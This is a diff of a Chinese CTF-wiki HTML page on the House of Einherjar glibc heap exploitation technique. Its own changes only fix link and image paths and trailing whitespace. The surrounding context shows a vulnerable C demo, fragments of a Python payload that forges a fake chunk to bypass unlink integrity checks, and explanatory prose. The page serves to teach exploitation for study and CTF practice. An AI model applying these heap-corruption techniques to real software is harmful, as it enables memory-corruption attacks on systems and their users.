@@ -1867,7 +1867,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../crypto/attack_summary/attack-mode/" title="简介" class="md-nav__link">
+    <a href="../../../crypto/attack-summary/attack-mode/" title="简介" class="md-nav__link">
       简介
     </a>
   </li>
@@ -1879,7 +1879,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../crypto/attack_summary/meet-in-the-middle/" title="中间相遇攻击" class="md-nav__link">
+    <a href="../../../crypto/attack-summary/meet-in-the-middle/" title="中间相遇攻击" class="md-nav__link">
       中间相遇攻击
     </a>
   </li>
@@ -1891,7 +1891,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../crypto/attack_summary/bit-attack/" title="比特攻击" class="md-nav__link">
+    <a href="../../../crypto/attack-summary/bit-attack/" title="比特攻击" class="md-nav__link">
       比特攻击
     </a>
   </li>
@@ -3898,7 +3898,7 @@
 </pre></div>
 
 <p>这里借用原作者的一张图片说明</p>
-<p><img alt="" src="/pwn/heap/figure/backward_consolidate.png" /></p>
+<p><img alt="" src="../figure/backward_consolidate.png" /></p>
 <p>关于整体的操作，请参考 <code>深入理解堆的实现</code> 那一章节。</p>
 <h3 id="_4">利用原理<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <p>这里我们就介绍该利用的原理。首先，在之前的堆的介绍中，我们可以知道以下的知识</p>
@@ -3911,14 +3911,14 @@
 <h3 id="_5">利用过程<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
 <h4 id="_6">溢出前<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
 <p>假设溢出前的状态如下</p>
-<p><img alt="" src="/pwn/heap/figure/einherjar_before_overflow.png" /></p>
+<p><img alt="" src="../figure/einherjar_before_overflow.png" /></p>
 <h4 id="_7">溢出<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
 <p>这里我们假设 p0 堆块一方面可以写prev_size字段，另一方面，存在off by one的漏洞，可以写下一个 chunk 的PREV_INUSE 部分，那么</p>
-<p><img alt="" src="/pwn/heap/figure/einherjar_overflowing.png" /></p>
+<p><img alt="" src="../figure/einherjar_overflowing.png" /></p>
 <h4 id="_8">溢出后<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h4>
 <p><strong>假设我们将 p1的 prev_size 字段设置为我们想要的目的 chunk 位置与p1的差值</strong>。在溢出后，我们释放p1，则我们所得到的新的 chunk 的位置 <code>chunk_at_offset(p1, -((long) prevsize))</code> 就是我们想要的 chunk 位置了。</p>
 <p>当然，需要注意的是，由于这里会对新的 chunk 进行 unlink ，因此需要确保在对应 chunk 位置构造好了fake chunk 以便于绕过 unlink 的检测。</p>
-<p><img alt="" src="/pwn/heap/figure/einherjar_after_overflow.png" /></p>
+<p><img alt="" src="../figure/einherjar_after_overflow.png" /></p>
 <h3 id="_9">攻击过程示例<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
 <p>可以进行 House Of Einherjar 攻击的代码：</p>
 <div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
@@ -3927,10 +3927,10 @@
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
     <span class="kt">char</span><span class="o">*</span> <span class="n">s0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span>　<span class="c1">//构造fake chunk</span>
-    <span class="kt">char</span><span class="o">*</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span> 
+    <span class="kt">char</span><span class="o">*</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
     <span class="kt">char</span><span class="o">*</span> <span class="n">s2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">);</span>　
     <span class="kt">char</span><span class="o">*</span> <span class="n">s3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span> <span class="c1">//为了不让s2与top chunk 合并</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;begin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> 
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;begin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">s0</span><span class="p">);</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">&quot;input s0</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
     <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s0</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span> <span class="c1">//读入fake chunk</span>
@@ -3954,7 +3954,7 @@
 <span class="sd">&#39;&#39;&#39;</span>
 <span class="sd">p64(address) * 2是为了绕过</span>
 <span class="sd">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span>
-<span class="sd">  malloc_printerr (&quot;corrupted double-linked list&quot;);  </span>
+<span class="sd">  malloc_printerr (&quot;corrupted double-linked list&quot;);</span>
 <span class="sd">&#39;&#39;&#39;</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1">#fake size</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
@@ -3986,7 +3986,7 @@
 
 <p>按照道理来讲 fake chunk 的 size 是 <code>0x221</code>  才合理，但是为什么  <code>0x101</code> 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的:</p>
 <div class="codehilite"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize</span><span class="p">(</span><span class="n">P</span><span class="p">)</span> <span class="o">!=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">next_chunk</span><span class="p">(</span><span class="n">P</span><span class="p">)),</span> <span class="mi">0</span><span class="p">))</span>      \
-      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;corrupted size vs. prev_size&quot;</span><span class="p">);</span>     
+      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;corrupted size vs. prev_size&quot;</span><span class="p">);</span>
 </pre></div>
 
 <p>所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。</p>
